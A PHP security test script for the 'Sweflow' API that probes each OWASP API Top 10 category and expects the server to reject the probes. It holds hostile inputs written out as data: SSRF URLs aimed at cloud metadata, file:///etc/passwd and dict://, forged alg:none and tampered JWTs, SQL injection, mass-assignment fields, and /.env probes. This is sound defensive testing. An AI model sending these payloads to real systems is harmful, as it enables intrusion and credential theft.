<?php
/**
 * Sweflow API — Testes de Segurança OWASP API Top 10 (2023)
 *
 * Execução: php tests/SecurityTest.php [BASE_URL]
 * Exemplo:  php tests/SecurityTest.php http://localhost:3005
 *
 * Cobre:
 *   API1  - BOLA (Broken Object Level Authorization / IDOR)
 *   API2  - Broken Authentication
 *   API3  - Broken Object Property Level Authorization (Mass Assignment)
 *   API4  - Unrestricted Resource Consumption (Rate Limiting / DoS)
 *   API5  - Broken Function Level Authorization (BFLA)
 *   API6  - Unrestricted Access to Sensitive Business Flows
 *   API7  - Server-Side Request Forgery (SSRF)
 *   API8  - Security Misconfiguration (Headers, CORS, Verbose Errors)
 *   API9  - Improper Inventory Management (Shadow APIs, Debug endpoints)
 *   API10 - Unsafe Consumption of APIs
 *   +     - Injeção (SQL, XSS, Command), Broken Cryptography, HTTP Verb Tampering
 */
declare(strict_types=1);

$baseUrl = $argv[1] ?? (getenv('APP_URL') ?: 'http://localhost:3005');
$baseUrl = rtrim($baseUrl, '/');

$passed = 0; $failed = 0; $skipped = 0; $results = [];
$GLOBALS['_sec_test_base'] = $baseUrl;

// ─── Helpers ─────────────────────────────────────────────────────────────────

function req(string $method, string $url, array $body = [], array $extraHeaders = [], int $timeout = 10): array {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_CUSTOMREQUEST  => strtoupper($method),
        CURLOPT_TIMEOUT        => $timeout,
        CURLOPT_FOLLOWLOCATION => false,
        CURLOPT_HEADER         => true,
        CURLOPT_HTTPHEADER     => array_merge(
            ['Content-Type: application/json', 'Accept: application/json'],
            $extraHeaders
        ),
    ]);
    if (!empty($body)) curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($body));
    $raw      = curl_exec($ch);
    $code     = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $hdrSize  = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $err      = curl_error($ch);
    curl_close($ch);
    if ($raw === false || $err) return ['status' => 0, 'body' => [], 'headers' => [], 'raw' => '', 'error' => $err];
    $rawHdr  = substr($raw, 0, $hdrSize);
    $rawBody = substr($raw, $hdrSize);
    $hdrs = [];
    foreach (explode("\r\n", $rawHdr) as $line) {
        if (str_contains($line, ':')) { [$k,$v] = explode(':', $line, 2); $hdrs[strtolower(trim($k))] = trim($v); }
    }
    $decoded = json_decode($rawBody, true);
    return ['status' => $code, 'body' => is_array($decoded) ? $decoded : ['_raw' => $rawBody], 'headers' => $hdrs, 'raw' => $rawBody, 'error' => null];
}

function reqRaw(string $method, string $url, string $rawBody, array $extraHeaders = []): array {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_CUSTOMREQUEST  => strtoupper($method),
        CURLOPT_TIMEOUT        => 10,
        CURLOPT_HEADER         => true,
        CURLOPT_POSTFIELDS     => $rawBody,
        CURLOPT_HTTPHEADER     => array_merge(['Content-Type: application/json', 'Accept: application/json'], $extraHeaders),
    ]);
    $raw = curl_exec($ch); $code = curl_getinfo($ch, CURLINFO_HTTP_CODE); $hdrSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE); curl_close($ch);
    if ($raw === false) return ['status' => 0, 'body' => [], 'headers' => [], 'raw' => ''];
    $rawBody2 = substr($raw, $hdrSize);
    $decoded = json_decode($rawBody2, true);
    return ['status' => $code, 'body' => is_array($decoded) ? $decoded : ['_raw' => $rawBody2], 'headers' => [], 'raw' => $rawBody2];
}

function test(string $name, callable $fn): void {
    global $passed, $failed, $results;
    try {
        $r = $fn();
        if ($r === true || $r === null) {
            $passed++; $results[] = ['status'=>'PASS','name'=>$name];
            echo "\033[32m  ✓\033[0m $name\n";
        } else {
            $failed++; $msg = is_string($r) ? $r : 'falhou';
            $results[] = ['status'=>'FAIL','name'=>$name,'reason'=>$msg];
            echo "\033[31m  ✗\033[0m $name\n    \033[33m→ $msg\033[0m\n";
        }
    } catch (\Throwable $e) {
        $failed++; $results[] = ['status'=>'FAIL','name'=>$name,'reason'=>$e->getMessage()];
        echo "\033[31m  ✗\033[0m $name\n    \033[33m→ ".$e->getMessage()."\033[0m\n";
    }
}

function skip(string $name, string $reason): void {
    global $skipped, $results;
    $skipped++; $results[] = ['status'=>'SKIP','name'=>$name,'reason'=>$reason];
    echo "\033[33m  ⊘\033[0m $name \033[2m($reason)\033[0m\n";
}

function assertStatus(array $res, int $exp): ?string {
    if ($res['status'] === 0) return "Servidor inacessível: ".($res['error']??'');
    if ($res['status'] !== $exp) return "Esperado HTTP $exp, recebido {$res['status']}";
    return null;
}
function assertOneOf(array $res, array $codes): ?string {
    if ($res['status'] === 0) return "Servidor inacessível";
    if (!in_array($res['status'], $codes)) return "Esperado um de [".implode(',',$codes)."], recebido {$res['status']}";
    return null;
}
function assertHasHeader(array $res, string $h): ?string {
    return isset($res['headers'][strtolower($h)]) ? null : "Header '$h' ausente";
}
function assertHeaderValue(array $res, string $h, string $contains): ?string {
    $v = $res['headers'][strtolower($h)] ?? '';
    return str_contains(strtolower($v), strtolower($contains)) ? null : "Header '$h' = '$v' não contém '$contains'";
}
function assertBodyNotContains(array $res, string $needle): ?string {
    $body = json_encode($res['body']);
    return str_contains(strtolower($body), strtolower($needle)) ? "Resposta vaza '$needle'" : null;
}
function assertNoToken(array $res): ?string {
    if (!empty($res['body']['access_token'])) return "Resposta contém access_token — possível bypass de autenticação";
    return null;
}

// ─── Conectividade ───────────────────────────────────────────────────────────

echo "\n\033[1;36m╔══════════════════════════════════════════════════════════╗\033[0m\n";
echo "\033[1;36m║   SWEFLOW API — OWASP API Security Top 10 (2023)         ║\033[0m\n";
echo "\033[1;36m╚══════════════════════════════════════════════════════════╝\033[0m\n";
echo "Base URL: \033[1m$baseUrl\033[0m\n\n";

$ping = req('GET', "$baseUrl/api/status");
if ($ping['status'] === 0) {
    echo "\033[31mERRO: Servidor não acessível em $baseUrl\033[0m\n";
    echo "Inicie com: php -S localhost:3005 index.php\n\n";
    exit(1);
}
echo "\033[32mServidor acessível (HTTP {$ping['status']})\033[0m\n\n";

// ═══════════════════════════════════════════════════════════════════════════
// API1:2023 — BOLA (Broken Object Level Authorization / IDOR)
// ═══════════════════════════════════════════════════════════════════════════
echo "\033[1m[API1] BOLA — Broken Object Level Authorization (IDOR)\033[0m\n";

test('BOLA: GET /api/usuario/{uuid} sem token retorna 401/403', function () use ($baseUrl) {
    $res = req('GET', "$baseUrl/api/usuario/00000000-0000-0000-0000-000000000001");
    return assertOneOf($res, [401, 403]);
});

test('BOLA: PUT /api/usuario/atualizar/{uuid} sem token retorna 401/403', function () use ($baseUrl) {
    $res = req('PUT', "$baseUrl/api/usuario/atualizar/00000000-0000-0000-0000-000000000001", ['nome_completo' => 'Hacker']);
    return assertOneOf($res, [401, 403]);
});

test('BOLA: DELETE /api/usuario/deletar/{uuid} sem token retorna 401/403', function () use ($baseUrl) {
    $res = req('DELETE', "$baseUrl/api/usuario/deletar/00000000-0000-0000-0000-000000000001");
    return assertOneOf($res, [401, 403]);
});

test('BOLA: PATCH /api/usuario/{uuid}/ativar sem token retorna 401/403', function () use ($baseUrl) {
    $res = req('PATCH', "$baseUrl/api/usuario/00000000-0000-0000-0000-000000000001/ativar");
    return assertOneOf($res, [401, 403]);
});

test('BOLA: PATCH /api/usuario/{uuid}/desativar sem token retorna 401/403', function () use ($baseUrl) {
    $res = req('PATCH', "$baseUrl/api/usuario/00000000-0000-0000-0000-000000000001/desativar");
    return assertOneOf($res, [401, 403]);
});

test('BOLA: UUID sequencial/previsível não retorna dados sem auth', function () use ($baseUrl) {
    foreach (['1', '2', '3', 'admin', 'root'] as $id) {
        $res = req('GET', "$baseUrl/api/usuario/$id");
        if (!in_array($res['status'], [401, 403, 404])) {
            return "UUID '$id' retornou HTTP {$res['status']} sem autenticação";
        }
    }
    return null;
});

test('BOLA: /api/perfil sem token retorna 401', function () use ($baseUrl) {
    $res = req('GET', "$baseUrl/api/perfil");
    return assertStatus($res, 401);
});

test('BOLA: PUT /api/perfil sem token retorna 401', function () use ($baseUrl) {
    $res = req('PUT', "$baseUrl/api/perfil", ['nome_completo' => 'Hacker']);
    return assertStatus($res, 401);
});

test('BOLA: DELETE /api/perfil sem token retorna 401', function () use ($baseUrl) {
    $res = req('DELETE', "$baseUrl/api/perfil");
    return assertStatus($res, 401);
});

// ═══════════════════════════════════════════════════════════════════════════
// API2:2023 — Broken Authentication
// ═══════════════════════════════════════════════════════════════════════════
echo "\n\033[1m[API2] Broken Authentication\033[0m\n";

test('AUTH: Login com credenciais vazias retorna 400/401', function () use ($baseUrl) {
    $res = req('POST', "$baseUrl/api/login", ['login' => '', 'senha' => '']);
    return assertOneOf($res, [400, 401]);
});

test('AUTH: Login com usuário inexistente retorna 401', function () use ($baseUrl) {
    $res = req('POST', "$baseUrl/api/login", ['login' => 'ghost_'.uniqid().'@x.invalid', 'senha' => 'qualquer123']);
    return assertStatus($res, 401);
});

test('AUTH: Login com senha errada retorna 401', function () use ($baseUrl) {
    $res = req('POST', "$baseUrl/api/login", ['login' => 'admin@example.com', 'senha' => 'errada_'.uniqid()]);
    return assertStatus($res, 401);
});

test('AUTH: Mensagem de erro não revela existência do usuário', function () use ($baseUrl) {
    $r1 = req('POST', "$baseUrl/api/login", ['login' => 'ghost_'.uniqid().'@x.invalid', 'senha' => 'abc']);
    $r2 = req('POST', "$baseUrl/api/login", ['login' => 'admin@example.com', 'senha' => 'errada']);
    $m1 = strtolower($r1['body']['message'] ?? '');
    if (str_contains($m1, 'não encontrado') || str_contains($m1, 'not found') || str_contains($m1, 'inexistente')) {
        return "Mensagem revela que usuário não existe: '$m1'";
    }
    return null;
});

test('AUTH: Token JWT malformado retorna 401', function () use ($baseUrl) {
    $res = req('GET', "$baseUrl/api/perfil", [], ['Authorization: Bearer token.invalido.aqui']);
    return assertStatus($res, 401);
});

test('AUTH: Token JWT com assinatura incorreta retorna 401', function () use ($baseUrl) {
    $h = rtrim(strtr(base64_encode('{"alg":"HS256","typ":"JWT"}'), '+/', '-_'), '=');
    $p = rtrim(strtr(base64_encode(json_encode(['sub'=>'uuid','tipo'=>'user','exp'=>time()+3600,'jti'=>'jti'])), '+/', '-_'), '=');
    $s = rtrim(strtr(base64_encode('assinatura_falsa_qualquer'), '+/', '-_'), '=');
    $res = req('GET', "$baseUrl/api/perfil", [], ["Authorization: Bearer $h.$p.$s"]);
    return assertStatus($res, 401);
});

test('AUTH: Token JWT expirado retorna 401', function () use ($baseUrl) {
    $h = rtrim(strtr(base64_encode('{"alg":"HS256","typ":"JWT"}'), '+/', '-_'), '=');
    $p = rtrim(strtr(base64_encode(json_encode(['sub'=>'uuid','tipo'=>'user','exp'=>time()-7200,'jti'=>'jti'])), '+/', '-_'), '=');
    $s = rtrim(strtr(base64_encode('sig'), '+/', '-_'), '=');
    $res = req('GET', "$baseUrl/api/perfil", [], ["Authorization: Bearer $h.$p.$s"]);
    return assertStatus($res, 401);
});

test('AUTH: Token vazio retorna 401', function () use ($baseUrl) {
    $res = req('GET', "$baseUrl/api/perfil", [], ['Authorization: Bearer ']);
    return assertStatus($res, 401);
});

test('AUTH: Authorization Basic (não Bearer) retorna 401', function () use ($baseUrl) {
    $res = req('GET', "$baseUrl/api/perfil", [], ['Authorization: Basic dXNlcjpwYXNz']);
    return assertStatus($res, 401);
});

test('AUTH: Token "none" algorithm não é aceito', function () use ($baseUrl) {
    // Ataque alg:none — assina com algoritmo "none" para bypassar verificação
    $h = rtrim(strtr(base64_encode('{"alg":"none","typ":"JWT"}'), '+/', '-_'), '=');
    $p = rtrim(strtr(base64_encode(json_encode(['sub'=>'admin','tipo'=>'user','nivel_acesso'=>'admin_system','exp'=>time()+3600,'jti'=>'jti'])), '+/', '-_'), '=');
    $res = req('GET', "$baseUrl/api/perfil", [], ["Authorization: Bearer $h.$p."]);
    return assertStatus($res, 401);
});

test('AUTH: Token com payload adulterado (nivel_acesso elevado) retorna 401', function () use ($baseUrl) {
    // Tenta elevar privilégio adulterando payload sem re-assinar
    $h = rtrim(strtr(base64_encode('{"alg":"HS256","typ":"JWT"}'), '+/', '-_'), '=');
    $p = rtrim(strtr(base64_encode(json_encode(['sub'=>'qualquer','tipo'=>'user','nivel_acesso'=>'admin_system','exp'=>time()+3600,'jti'=>'jti-fake'])), '+/', '-_'), '=');
    $s = rtrim(strtr(base64_encode('assinatura_invalida'), '+/', '-_'), '=');
    $res = req('GET', "$baseUrl/api/usuarios", [], ["Authorization: Bearer $h.$p.$s"]);
    return assertOneOf($res, [401, 403]);
});

test('AUTH: Refresh token inválido retorna 401/400', function () use ($baseUrl) {
    $res = req('POST', "$baseUrl/api/auth/refresh", ['refresh_token' => 'token.invalido.aqui']);
    return assertOneOf($res, [400, 401]);
});

test('AUTH: Refresh token vazio retorna 400', function () use ($baseUrl) {
    $res = req('POST', "$baseUrl/api/auth/refresh", ['refresh_token' => '']);
    return assertOneOf($res, [400, 401]);
});

// ═══════════════════════════════════════════════════════════════════════════
// API3:2023 — Broken Object Property Level Authorization (Mass Assignment)
// ═══════════════════════════════════════════════════════════════════════════
echo "\n\033[1m[API3] Mass Assignment / Broken Object Property Level Auth\033[0m\n";

test('MASS: Registro com nivel_acesso=admin_system não eleva privilégio', function () use ($baseUrl) {
    $uid = uniqid();
    $res = req('POST', "$baseUrl/api/registrar", [
        'nome_completo' => 'Hacker Test',
        'username'      => "hacker_$uid",
        'email'         => "hacker_$uid@test.invalid",
        'senha'         => 'Senha@12345',
        'nivel_acesso'  => 'admin_system',
        'is_admin'      => true,
        'role'          => 'admin',
    ]);
    // Se criou (201), verifica que não virou admin
    if ($res['status'] === 201) {
        // Tenta logar e acessar rota admin
        $login = req('POST', "$baseUrl/api/login", ['login' => "hacker_$uid@test.invalid", 'senha' => 'Senha@12345']);
        $token = $login['body']['access_token'] ?? null;
        if ($token) {
            $admin = req('GET', "$baseUrl/api/usuarios", [], ["Authorization: Bearer $token"]);
            if ($admin['status'] === 200) return "Mass assignment elevou usuário para admin_system — CRÍTICO";
        }
    }
    return null;
});

test('MASS: Registro com ativo=true não bypassa desativação', function () use ($baseUrl) {
    $res = req('POST', "$baseUrl/api/registrar", [
        'nome_completo' => 'Test User',
        'username'      => 'masstest_'.uniqid(),
        'email'         => 'masstest_'.uniqid().'@test.invalid',
        'senha'         => 'Senha@12345',
        'ativo'         => true,
        'email_verificado' => true,
        'status_verificacao' => 'verificado',
    ]);
    if ($res['status'] === 500) return "Mass assignment causou erro 500";
    return null;
});

test('MASS: Campos __proto__ e constructor não causam prototype pollution', function () use ($baseUrl) {
    $res = req('POST', "$baseUrl/api/login", [
        'login' => 'test@test.com',
        'senha' => 'test',
        '__proto__' => ['admin' => true, 'isAdmin' => true],
        'constructor' => ['prototype' => ['admin' => true]],
    ]);
    if ($res['status'] === 500) return "Prototype pollution causou erro 500";
    return assertNoToken($res);
});

test('MASS: PUT /api/perfil não aceita elevação de nivel_acesso sem auth', function () use ($baseUrl) {
    $res = req('PUT', "$baseUrl/api/perfil", ['nivel_acesso' => 'admin_system']);
    return assertStatus($res, 401);
});

// ═══════════════════════════════════════════════════════════════════════════
// API4:2023 — Unrestricted Resource Consumption
// ═══════════════════════════════════════════════════════════════════════════
echo "\n\033[1m[API4] Unrestricted Resource Consumption\033[0m\n";

test('RESOURCE: Payload JSON > 1MB não causa crash (500)', function () use ($baseUrl) {
    $res = req('POST', "$baseUrl/api/login", ['login' => str_repeat('a', 1024*1024), 'senha' => 'x']);
    if ($res['status'] === 500) return "Payload 1MB causou erro 500";
    return null;
});

test('RESOURCE: Payload JSON > 5MB não causa crash', function () use ($baseUrl) {
    $res = req('POST', "$baseUrl/api/login", ['login' => str_repeat('b', 5*1024*1024), 'senha' => 'x'], [], 15);
    if ($res['status'] === 500) return "Payload 5MB causou erro 500";
    return null;
});

test('RESOURCE: 10 requisições rápidas ao login não causam crash', function () use ($baseUrl) {
    for ($i = 0; $i < 10; $i++) {
        $res = req('POST', "$baseUrl/api/login", ['login' => "user$i@test.com", 'senha' => 'errada']);
        if ($res['status'] === 500) return "Requisição $i causou erro 500";
        if ($res['status'] === 0) return "Servidor parou de responder na requisição $i";
    }
    return null;
});

test('RESOURCE: 10 requisições rápidas ao registro não causam crash', function () use ($baseUrl) {
    for ($i = 0; $i < 10; $i++) {
        $res = req('POST', "$baseUrl/api/registrar", [
            'nome_completo' => "Flood $i",
            'username'      => 'flood_'.uniqid(),
            'email'         => 'flood_'.uniqid().'@test.invalid',
            'senha'         => 'Senha@12345',
        ]);
        if ($res['status'] === 500) return "Requisição de registro $i causou erro 500";
        if ($res['status'] === 0) return "Servidor parou de responder na requisição $i";
    }
    return null;
});

test('RESOURCE: Nested JSON profundo não causa stack overflow', function () use ($baseUrl) {
    $nested = 'x';
    for ($i = 0; $i < 200; $i++) $nested = ['a' => $nested];
    $res = req('POST', "$baseUrl/api/login", ['login' => $nested, 'senha' => 'x']);
    if ($res['status'] === 500) return "JSON profundamente aninhado causou erro 500";
    return null;
});

test('RESOURCE: Array com 10.000 elementos não causa crash', function () use ($baseUrl) {
    $res = req('POST', "$baseUrl/api/login", ['login' => array_fill(0, 10000, 'x'), 'senha' => 'x']);
    if ($res['status'] === 500) return "Array grande causou erro 500";
    return null;
});

// ═══════════════════════════════════════════════════════════════════════════
// API5:2023 — Broken Function Level Authorization (BFLA)
// ═══════════════════════════════════════════════════════════════════════════
echo "\n\033[1m[API5] Broken Function Level Authorization (BFLA)\033[0m\n";

test('BFLA: GET /api/usuarios (admin) sem token retorna 401/403', function () use ($baseUrl) {
    $res = req('GET', "$baseUrl/api/usuarios");
    return assertOneOf($res, [401, 403]);
});

test('BFLA: GET /api/system/modules (admin) sem token retorna 401/403', function () use ($baseUrl) {
    $res = req('GET', "$baseUrl/api/system/modules");
    return assertOneOf($res, [401, 403]);
});

test('BFLA: POST /api/system/modules/toggle sem token retorna 401/403', function () use ($baseUrl) {
    $res = req('POST', "$baseUrl/api/system/modules/toggle", ['name' => 'Auth', 'enabled' => false]);
    return assertOneOf($res, [401, 403]);
});

test('BFLA: POST /api/system/modules/install sem token retorna 401/403', function () use ($baseUrl) {
    $res = req('POST', "$baseUrl/api/system/modules/install", ['name' => 'malicious']);
    return assertOneOf($res, [401, 403]);
});

test('BFLA: POST /api/system/modules/uninstall sem token retorna 401/403', function () use ($baseUrl) {
    $res = req('POST', "$baseUrl/api/system/modules/uninstall", ['name' => 'Auth']);
    return assertOneOf($res, [401, 403]);
});

test('BFLA: GET /api/capabilities sem token retorna 401/403', function () use ($baseUrl) {
    $res = req('GET', "$baseUrl/api/capabilities");
    return assertOneOf($res, [401, 403]);
});

test('BFLA: POST /api/capabilities/provider sem token retorna 401/403', function () use ($baseUrl) {
    $res = req('POST', "$baseUrl/api/capabilities/provider", ['capability' => 'email', 'provider' => 'evil']);
    return assertOneOf($res, [401, 403]);
});

test('BFLA: GET /api/dashboard/metrics sem token retorna 401/403', function () use ($baseUrl) {
    $res = req('GET', "$baseUrl/api/dashboard/metrics");
    return assertOneOf($res, [401, 403]);
});

test('BFLA: GET /api/modules/state sem token retorna 401/403', function () use ($baseUrl) {
    $res = req('GET', "$baseUrl/api/modules/state");
    return assertOneOf($res, [401, 403]);
});

test('BFLA: POST /api/modules/toggle sem token retorna 401/403', function () use ($baseUrl) {
    $res = req('POST', "$baseUrl/api/modules/toggle", ['name' => 'Auth', 'enabled' => false]);
    return assertOneOf($res, [401, 403]);
});

test('BFLA: GET /dashboard sem token retorna 401/403', function () use ($baseUrl) {
    $res = req('GET', "$baseUrl/dashboard");
    return assertOneOf($res, [401, 403]);
});

test('BFLA: GET /modules/marketplace sem token retorna 401/403', function () use ($baseUrl) {
    $res = req('GET', "$baseUrl/modules/marketplace");
    return assertOneOf($res, [401, 403]);
});

// ═══════════════════════════════════════════════════════════════════════════
// API6:2023 — Unrestricted Access to Sensitive Business Flows
// ═══════════════════════════════════════════════════════════════════════════
echo "\n\033[1m[API6] Unrestricted Access to Sensitive Business Flows\033[0m\n";

test('FLOW: Recuperação de senha com e-mail inexistente retorna 200 (anti-enumeração)', function () use ($baseUrl) {
    $res = req('POST', "$baseUrl/api/auth/recuperacao-senha", ['email' => 'ghost_'.uniqid().'@test.invalid']);
    return assertStatus($res, 200);
});

test('FLOW: Recuperação de senha com e-mail inválido retorna 400', function () use ($baseUrl) {
    $res = req('POST', "$baseUrl/api/auth/recuperacao-senha", ['email' => 'nao-e-email']);
    return assertStatus($res, 400);
});

test('FLOW: Token de recuperação inválido retorna 400', function () use ($baseUrl) {
    $res = req('POST', "$baseUrl/api/auth/resetar-senha", ['token' => 'token_invalido_'.uniqid(), 'nova_senha' => 'NovaSenha@123']);
    return assertOneOf($res, [400, 404]);
});

test('FLOW: Reset de senha com nova senha curta retorna 400', function () use ($baseUrl) {
    $res = req('POST', "$baseUrl/api/auth/resetar-senha", ['token' => 'qualquer', 'nova_senha' => '123']);
    return assertStatus($res, 400);
});

test('FLOW: Verificação de e-mail com token inválido retorna 400', function () use ($baseUrl) {
    $res = req('GET', "$baseUrl/api/auth/verify-email?token=token_invalido_".uniqid());
    return assertOneOf($res, [400, 404]);
});

test('FLOW: Verificação de e-mail sem token retorna 400', function () use ($baseUrl) {
    $res = req('GET', "$baseUrl/api/auth/verify-email");
    return assertStatus($res, 400);
});

test('FLOW: Registro com campos obrigatórios ausentes retorna 400', function () use ($baseUrl) {
    $res = req('POST', "$baseUrl/api/registrar", ['nome_completo' => 'Apenas Nome']);
    return assertStatus($res, 400);
});

test('FLOW: Registro com e-mail inválido retorna 400', function () use ($baseUrl) {
    $res = req('POST', "$baseUrl/api/registrar", [
        'nome_completo' => 'Test', 'username' => 'test_'.uniqid(),
        'email' => 'nao-e-email', 'senha' => 'Senha@12345',
    ]);
    return assertOneOf($res, [400, 422]);
});

test('FLOW: Registro com senha < 8 chars retorna 400', function () use ($baseUrl) {
    $res = req('POST', "$baseUrl/api/registrar", [
        'nome_completo' => 'Test', 'username' => 'test_'.uniqid(),
        'email' => 'test_'.uniqid().'@test.invalid', 'senha' => '1234567',
    ]);
    return assertOneOf($res, [400, 422]);
});

// ═══════════════════════════════════════════════════════════════════════════
// API7:2023 — Server-Side Request Forgery (SSRF)
// ═══════════════════════════════════════════════════════════════════════════
echo "\n\033[1m[API7] Server-Side Request Forgery (SSRF)\033[0m\n";

test('SSRF: URL interna em campo de avatar não causa requisição interna', function () use ($baseUrl) {
    $res = req('POST', "$baseUrl/api/registrar", [
        'nome_completo' => 'SSRF Test',
        'username'      => 'ssrf_'.uniqid(),
        'email'         => 'ssrf_'.uniqid().'@test.invalid',
        'senha'         => 'Senha@12345',
        'url_avatar'    => 'http://169.254.169.254/latest/meta-data/',
        'url_capa'      => 'http://localhost/admin',
    ]);
    // Não deve causar timeout ou erro 500 por tentar buscar a URL
    if ($res['status'] === 0) return "Servidor não respondeu — possível SSRF causando timeout";
    if ($res['status'] === 500) return "SSRF causou erro 500 ao tentar buscar URL interna";
    return null;
});

test('SSRF: URL file:// em campo de avatar não é processada', function () use ($baseUrl) {
    $res = req('POST', "$baseUrl/api/registrar", [
        'nome_completo' => 'SSRF File',
        'username'      => 'ssrf_file_'.uniqid(),
        'email'         => 'ssrf_file_'.uniqid().'@test.invalid',
        'senha'         => 'Senha@12345',
        'url_avatar'    => 'file:///etc/passwd',
    ]);
    if ($res['status'] === 0) return "Servidor não respondeu — possível SSRF";
    if ($res['status'] === 500) return "file:// causou erro 500";
    // Verifica que o conteúdo de /etc/passwd não aparece na resposta
    $body = json_encode($res['body']);
    if (str_contains($body, 'root:') || str_contains($body, '/bin/bash')) {
        return "SSRF: conteúdo de /etc/passwd vazou na resposta — CRÍTICO";
    }
    return null;
});

test('SSRF: URL dict:// não é processada', function () use ($baseUrl) {
    $res = req('POST', "$baseUrl/api/registrar", [
        'nome_completo' => 'SSRF Dict',
        'username'      => 'ssrf_dict_'.uniqid(),
        'email'         => 'ssrf_dict_'.uniqid().'@test.invalid',
        'senha'         => 'Senha@12345',
        'url_avatar'    => 'dict://localhost:11211/stat',
    ]);
    if ($res['status'] === 500) return "dict:// causou erro 500";
    return null;
});

// ═══════════════════════════════════════════════════════════════════════════
// API8:2023 — Security Misconfiguration
// ═══════════════════════════════════════════════════════════════════════════
echo "\n\033[1m[API8] Security Misconfiguration\033[0m\n";

test('MISCONFIG: X-Content-Type-Options: nosniff presente', function () use ($baseUrl) {
    $res = req('GET', "$baseUrl/api/status");
    return assertHasHeader($res, 'x-content-type-options');
});

test('MISCONFIG: X-Frame-Options presente', function () use ($baseUrl) {
    $res = req('GET', "$baseUrl/api/status");
    return assertHasHeader($res, 'x-frame-options');
});

test('MISCONFIG: Referrer-Policy presente', function () use ($baseUrl) {
    $res = req('GET', "$baseUrl/api/status");
    return assertHasHeader($res, 'referrer-policy');
});

test('MISCONFIG: Permissions-Policy presente', function () use ($baseUrl) {
    $res = req('GET', "$baseUrl/api/status");
    return assertHasHeader($res, 'permissions-policy');
});

test('MISCONFIG: Content-Type é application/json nas respostas de API', function () use ($baseUrl) {
    $res = req('GET', "$baseUrl/api/status");
    $ct = $res['headers']['content-type'] ?? '';
    if (!str_contains($ct, 'application/json')) return "Content-Type: $ct";
    return null;
});

test('MISCONFIG: X-Powered-By não expõe versão do PHP', function () use ($baseUrl) {
    $res = req('GET', "$baseUrl/api/status");
    $xpb = $res['headers']['x-powered-by'] ?? '';
    if (preg_match('/PHP\/[\d.]+/i', $xpb)) return "X-Powered-By expõe versão: $xpb";
    return null;
});

test('MISCONFIG: Erro 500 não expõe stack trace', function () use ($baseUrl) {
    $res = req('POST', "$baseUrl/api/login", ['login' => 'x', 'senha' => 'y']);
    $body = json_encode($res['body']);
    if (str_contains($body, '#0 ') || str_contains($body, 'Stack trace') || str_contains($body, 'Trace:')) {
        return "Stack trace exposto na resposta";
    }
    return null;
});

test('MISCONFIG: Erro não expõe caminhos absolutos do servidor', function () use ($baseUrl) {
    $res = req('GET', "$baseUrl/api/rota-inexistente-".uniqid());
    $body = json_encode($res['body']);
    if (preg_match('#(/var/www|/home/|/usr/local|C:\\\\Users|C:\\\\inetpub)#i', $body)) {
        return "Caminho do servidor exposto: $body";
    }
    return null;
});

test('MISCONFIG: Erro não expõe nome de classes internas do framework', function () use ($baseUrl) {
    $res = req('GET', "$baseUrl/api/rota-inexistente-".uniqid());
    $body = json_encode($res['body']);
    // Em produção (APP_DEBUG=false) não deve expor nomes de classe
    // Em dev pode expor — verificamos apenas que não há trace completo
    if (str_contains($body, 'Src\\Kernel\\Nucleo\\Router') && str_contains($body, '#')) {
        return "Stack trace com classes internas exposto";
    }
    return null;
});

test('MISCONFIG: CORS não retorna wildcard (*) em rota autenticada', function () use ($baseUrl) {
    $res = req('GET', "$baseUrl/api/perfil", [], ['Origin: https://evil-attacker.com']);
    $acao = $res['headers']['access-control-allow-origin'] ?? '';
    if ($acao === '*') return "Access-Control-Allow-Origin: * em rota autenticada";
    return null;
});

test('MISCONFIG: OPTIONS não causa erro 500', function () use ($baseUrl) {
    $res = req('OPTIONS', "$baseUrl/api/login", [], ['Origin: http://localhost:3000', 'Access-Control-Request-Method: POST']);
    if ($res['status'] === 500) return "OPTIONS causou erro 500";
    return null;
});

test('MISCONFIG: Rota inexistente retorna 404 com JSON', function () use ($baseUrl) {
    $res = req('GET', "$baseUrl/api/rota-inexistente-".uniqid());
    if ($res['status'] !== 404) return "Esperado 404, recebido {$res['status']}";
    if (!isset($res['body']['erro']) && !isset($res['body']['error']) && !isset($res['body']['message'])) {
        return "404 sem campo de erro no JSON";
    }
    return null;
});

test('MISCONFIG: Verbose error — resposta não contém "password" ou "senha" em texto claro', function () use ($baseUrl) {
    $res = req('POST', "$baseUrl/api/login", ['login' => "' OR 1=1 --", 'senha' => 'x']);
    $body = strtolower(json_encode($res['body']));
    // Não deve vazar a senha ou hash
    if (preg_match('/\$2[ayb]\$/', $body)) return "Hash bcrypt vazou na resposta";
    return null;
});

// ═══════════════════════════════════════════════════════════════════════════
// API9:2023 — Improper Inventory Management (Shadow/Zombie APIs)
// ═══════════════════════════════════════════════════════════════════════════
echo "\n\033[1m[API9] Improper Inventory Management\033[0m\n";

test('INVENTORY: /swagger.json não está exposto publicamente', function () use ($baseUrl) {
    $res = req('GET', "$baseUrl/swagger.json");
    if ($res['status'] === 200) return "/swagger.json exposto publicamente — documentação vaza estrutura da API";
    return null;
});

test('INVENTORY: /swagger-ui não está exposto', function () use ($baseUrl) {
    $res = req('GET', "$baseUrl/swagger-ui");
    if ($res['status'] === 200) return "/swagger-ui exposto publicamente";
    return null;
});

test('INVENTORY: /openapi.json não está exposto', function () use ($baseUrl) {
    $res = req('GET', "$baseUrl/openapi.json");
    if ($res['status'] === 200) return "/openapi.json exposto publicamente";
    return null;
});

test('INVENTORY: /api/v1 (versão antiga) não está exposta', function () use ($baseUrl) {
    $res = req('GET', "$baseUrl/api/v1/status");
    // Deve retornar 404, não 200 com dados
    if ($res['status'] === 200 && !empty($res['body'])) return "/api/v1 exposta — versão antiga ativa";
    return null;
});

test('INVENTORY: /api/v2 não está exposta', function () use ($baseUrl) {
    $res = req('GET', "$baseUrl/api/v2/status");
    if ($res['status'] === 200 && !empty($res['body'])) return "/api/v2 exposta";
    return null;
});

test('INVENTORY: /.env não está acessível via HTTP', function () use ($baseUrl) {
    $res = req('GET', "$baseUrl/.env");
    if ($res['status'] === 200) {
        $body = $res['raw'] ?? '';
        if (str_contains($body, 'DB_') || str_contains($body, 'JWT_') || str_contains($body, 'APP_')) {
            return ".env acessível via HTTP — CRÍTICO: credenciais expostas";
        }
    }
    return null;
});

